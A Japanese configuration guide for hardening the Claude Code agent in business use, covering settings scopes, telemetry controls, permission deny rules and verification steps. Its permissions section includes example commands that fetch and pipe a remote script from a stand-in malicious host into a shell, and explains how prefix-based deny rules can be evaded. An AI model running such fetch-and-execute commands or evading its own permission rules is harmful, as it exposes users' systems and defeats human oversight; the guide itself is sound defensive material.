# Claude Code 業務利用向けセキュリティ設定ガイド

このドキュメントは `examples/` 配下の設定ファイルテンプレートの補足解説です。
設定の **「なぜ」** と **「どう使うか」** を説明します。

---

## 1. 設定スコープと優先順位

Claude Code の settings.json は **5 つのスコープ** があり、高い方が低い方を上書きします。

```
優先度（高）
│ Managed           C:\Program Files\ClaudeCode\managed-settings.json  ← IT部門が配置・管理者権限必要
│ CLI引数            claude --arg=...  ← セッション一時
│ Local             .claude/settings.local.json  ← リポジトリ内・git追跡しない
│ Project           .claude/settings.json  ← リポジトリ内・git追跡する
│ User              %USERPROFILE%\.claude\settings.json  ← 個人設定
優先度（低）
```

### Windows のマネージド設定パス（実機で要確認）

公式ドキュメントには以下が記載されています：

| 方法 | パス / キー |
|------|------------|
| ファイル | `C:\Program Files\ClaudeCode\managed-settings.json` |
| ドロップイン | `C:\Program Files\ClaudeCode\managed-settings.d\*.json` |
| Group Policy / Intune | `HKLM\SOFTWARE\Policies\ClaudeCode` |

> **注意**: 過去のバージョンでは `C:\ProgramData\ClaudeCode\` が使われていた記録もあります。
> `claude --debug` で起動して出力されるログで実際の読込パスを必ず確認してください。

### ファイル配置と共有

| スコープ | Gitで共有 | 用途 |
|---------|-----------|------|
| Managed | しない（IT配布） | 組織強制ポリシー（上書き不可） |
| Project | する | チーム共通のプロジェクトポリシー |
| Local | しない（.gitignore） | 個人のプロジェクト内調整 |
| User | しない | 個人の全プロジェクト共通設定 |

---

## 2. テンプレートの使い分け

### `user-settings.recommended.json`（推奨・バランス型）

**対象**: 一般的な業務開発者。日常的な git 操作・ビルド・テストを阻害せず、危険な操作だけをブロック。

- `defaultMode: "default"` → 都度プロンプトで確認（通常モード）
- 安全な git/npm コマンドは事前 allow
- `git push` や `WebFetch` は `ask`（確認あり）
- 4カテゴリの危険操作は `deny`

**コピー先**（ユーザー設定として使う場合）:
```
%USERPROFILE%\.claude\settings.json
```

### `user-settings.strict.json`（最厳格・許可リスト型）

**対象**: 機密性の高いプロジェクト担当者、セキュリティ審査の厳しい案件。

- `defaultMode: "plan"` → デフォルトで読み取り専用の計画モードから開始。書き込み系は手動昇格が必要
- `allow` に明示したコマンドだけ自動承認
- `WebFetch` を含む外部通信は全面 deny
- クラウド CLI（`aws` / `gcloud` / `az`）、`kubectl`、`terraform` も deny

**コピー先**（特定プロジェクトに適用する場合）:
```
<リポジトリルート>/.claude/settings.json
```

### `managed-settings.json`（IT強制レイヤー）

**対象**: 組織全体に強制したい最小限のポリシー。ユーザー設定・プロジェクト設定でも上書き不可。

- `disableBypassPermissionsMode: true` → `bypassPermissions` モードへの切り替えを封鎖
- 認証強制（`forceLoginMethod` / `forceLoginOrgUUID`）を設定（placeholder → 後述の「認証強制の設定方法」参照）
- deny は「絶対に禁止」の最後の砦として重複して設定

**配置先**（管理者権限が必要）:
```
C:\Program Files\ClaudeCode\managed-settings.json
```

---

## 3. 通信制御：ハイブリッド方針の解説

本テンプレートは「Anthropic への非必須通信は止める」＋「監査ログは自社 OTEL で収集する」という
**ハイブリッド方針**を採用しています。

```
┌─────────────────────────────────────────────────────────────┐
│ Claude Code プロセス                                         │
│                                                             │
│  推論 API リクエスト ──────────────────────→ Anthropic API  │  ← 必須（止められない）
│  テレメトリ（Anthropic向け） ─── STOP ──────→ [遮断]       │  ← DISABLE_TELEMETRY=1
│  自動更新 ──────────────────── STOP ──────→ [遮断]         │  ← DISABLE_AUTOUPDATER=1
│  エラー報告 ────────────────── STOP ──────→ [遮断]         │  ← DISABLE_ERROR_REPORTING=1
│                                                             │
│  OTEL メトリクス / ログ ────────────────→ 自社コレクタ     │  ← CLAUDE_CODE_ENABLE_TELEMETRY=1
└─────────────────────────────────────────────────────────────┘
                                                ↓
                                  Datadog / Grafana / 社内SIEMなど
```

### 各環境変数の意味

| 変数 | 値 | 効果 |
|------|----|------|
| `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` | `1` | 非必須通信のマスタースイッチ（下記3つをまとめて止める） |
| `DISABLE_AUTOUPDATER` | `1` | バージョンチェック・自動ダウンロードを停止 |
| `DISABLE_ERROR_REPORTING` | `1` | クラッシュレポート・エラー送信を停止 |
| `DISABLE_TELEMETRY` | `1` | Anthropic向けの利用統計送信を停止 |
| `CLAUDE_CODE_ENABLE_TELEMETRY` | `1` | **自社 OTEL コレクタへの**テレメトリ送信を有効化 |
| `OTEL_METRICS_EXPORTER` | `otlp` | メトリクスを OTLP 形式で送信 |
| `OTEL_LOGS_EXPORTER` | `otlp` | ログを OTLP 形式で送信 |
| `OTEL_EXPORTER_OTLP_ENDPOINT` | `https://...` | 自社 OTEL コレクタの URL（要変更） |

`DISABLE_TELEMETRY=1`（Anthropic 向けを止める）と `CLAUDE_CODE_ENABLE_TELEMETRY=1`（自社向けを有効にする）は
**共存できます**。送信先が別々だからです。

### 通信制御なしで「Anthropic にどのデータが送られるか」

`CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` を設定しない場合、以下が送信されます：
- 利用モデル・トークン数・使用ツール名などの統計
- クラッシュ発生時のスタックトレース
- バージョンチェックのための HTTP リクエスト

コードの中身・プロンプト内容そのものは通常の推論 API を通じて送られますが、
その API 通信は止められません（Claude Code の本質機能のため）。

---

## 4. 権限(permissions)の設計

### deny / allow / ask の優先順位

```
deny > allow > ask > defaultMode
```

deny は **どこに書いてあっても最優先でブロック**されます。
managed-settings.json の deny は user-settings.json の allow より強い。

### Bash の deny パターンの注意点（重要）

`Bash(curl:*)` は「curl で始まるコマンド」を接頭辞マッチでブロックします。
しかし以下のような**パイプ経由の回避**は防げません：

```bash
# これは Bash(curl:*) でブロックされる
curl https://malicious.example/script.sh

# これは Bash(sh:*) か Bash(bash:*) の deny が必要
sh -c "$(curl https://malicious.example/script.sh)"

# これは Bash(python:*) の deny が必要
python -c "import urllib.request; urllib.request.urlopen('https://...')"
```

**結論**: Bash の deny はベストエフォート。
真のガードは `defaultMode` による人間の確認（推奨型）または `defaultMode: "plan"` + `allow` ホワイトリスト（厳格型）です。
マネージド設定の `disableBypassPermissionsMode: true` を組み合わせることで、
ユーザーがパーミッションを無効化することを防げます。

### 4カテゴリの deny 解説

#### カテゴリ1: 機密ファイル読取
`.env` / 秘密鍵（`.pem`, `.key`, `id_rsa`, etc.）/ クラウド認証情報（`~/.aws`, `~/.kube`, etc.）の Read・Edit を禁止。

#### カテゴリ2: 外部ダウンロード・送信
`curl`, `wget`, `Invoke-WebRequest` などによるデータの持ち出しや不正なコードのダウンロードを防止。
厳格型は `WebFetch` ツール自体も deny に含む（内部 HTTP クライアントも封じる）。

#### カテゴリ3: 破壊的コマンド
`rm -rf`, `git reset --hard`, `git push --force` などの取り消し困難な操作。
推奨型は `rm -rf` のみ、厳格型は `rm` 全般を deny。

#### カテゴリ4: コード実行・権限昇格
`sudo`, `runas`, `Start-Process`（Windows 権限昇格）や `npm publish`, `docker push`（外部への公開）を禁止。

---

## 5. 認証強制の設定方法（managed-settings.json）

`managed-settings.json` の以下フィールドに実値を入れてください。

### `forceLoginMethod` の選択肢

| 値 | 意味 | 向いているケース |
|----|------|----------------|
| `"claudeai"` | Claude.ai アカウントのみ許可 | Claude Pro/Max/Team/Enterprise サブスクリプション |
| `"console"` | Claude Console（API課金）のみ許可 | Console で API キー管理している組織 |

設定例:
```json
"forceLoginMethod": "claudeai"
```

### `forceLoginOrgUUID` の取得方法

Claude for Teams/Enterprise を使っている場合、組織 UUID を指定すると
**その組織のメンバーのみ**が使えるようになります（他アカウントでの起動をブロック）。

UUID の取得先:
- Claude.ai → 管理者ダッシュボード → 組織設定 → 組織 ID
- または Anthropic サポートに問い合わせ

設定例:
```json
"forceLoginOrgUUID": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxfffff"
```

> **placeholder のまま使わないこと**: `<YOUR-ORG-UUID>` という文字列のままでは JSON の値が不正になります。
> 実際に運用する際は必ず実値に置き換えるか、`forceLoginOrgUUID` キー自体を削除してください。

---

## 6. 個人設定 `skipDangerousModePermissionPrompt` について

現在の `~/.claude/settings.json` に含まれる可能性がある以下の設定は、
**業務利用においてはセキュリティ上外すことを推奨**します。

```json
"skipDangerousModePermissionPrompt": true
```

これは `bypassPermissions` モードへの切り替え時の確認プロンプトをスキップする設定です。
意図せず設定されている場合、Claude Code がすべての操作を確認なしで実行できるモードに
誰でも切り替えられる状態になります。

本テンプレートではこの設定は含めていません。
マネージド設定の `disableBypassPermissionsMode: true` により、バイパスモード自体を封じることを推奨します。

---

## 7. 検証手順

### Step 1: JSON 構文チェック

```powershell
Get-Content "examples\user-settings.recommended.json" | ConvertFrom-Json
Get-Content "examples\user-settings.strict.json"     | ConvertFrom-Json
Get-Content "examples\managed-settings.json"          | ConvertFrom-Json
```

エラーが出なければ構文 OK。

### Step 2: テスト用コピーと設定反映確認

推奨型をユーザー設定に一時コピーする場合（元設定のバックアップを忘れずに）:

```powershell
# バックアップ
Copy-Item "$env:USERPROFILE\.claude\settings.json" "$env:USERPROFILE\.claude\settings.json.bak"

# テンプレートを適用
Copy-Item "examples\user-settings.recommended.json" "$env:USERPROFILE\.claude\settings.json"
```

Claude Code 起動後に `/config` でキーを確認、`/permissions` で deny ルールを確認。

### Step 3: 設定読込先の確認

```powershell
claude --debug 2>&1 | Select-String -Pattern "settings|config|managed"
```

どのパスから設定が読まれているか確認できます。

### Step 4: deny の動作テスト

以下をプロンプトで指示し、ブロックされることを確認:
- `.env` ファイルの読み取りを依頼 → `Read` が deny されるはず
- `curl` でURLにアクセスするよう依頼 → `Bash(curl:*)` が deny されるはず

### Step 5: 元の設定に戻す

```powershell
Move-Item "$env:USERPROFILE\.claude\settings.json.bak" "$env:USERPROFILE\.claude\settings.json" -Force
```

---

## 8. OTEL エンドポイントの差し替え

`examples/` 内の全 JSON の `OTEL_EXPORTER_OTLP_ENDPOINT` は placeholder です。
実際の運用環境に合わせて変更してください。

| 自社監査基盤 | エンドポイント例 |
|-------------|----------------|
| Datadog | `https://otel.datadoghq.com` |
| Honeycomb | `https://api.honeycomb.io` |
| Grafana Cloud | `https://<instance>.grafana.net/otlp` |
| 自前コレクタ | `http://localhost:4317`（gRPC）/ `http://localhost:4318`（HTTP） |

OTEL ヘッダー（API キー等）が必要な場合は `OTEL_EXPORTER_OTLP_HEADERS` に追加:

```json
"OTEL_EXPORTER_OTLP_HEADERS": "x-api-key=YOUR-API-KEY"
```

---

## 参考リンク

- [Claude Code 設定リファレンス](https://code.claude.com/docs/en/settings)
- [Claude Code 認証ドキュメント](https://code.claude.com/docs/en/iam)
- [OpenTelemetry OTLP Exporter](https://opentelemetry.io/docs/specs/otlp/)
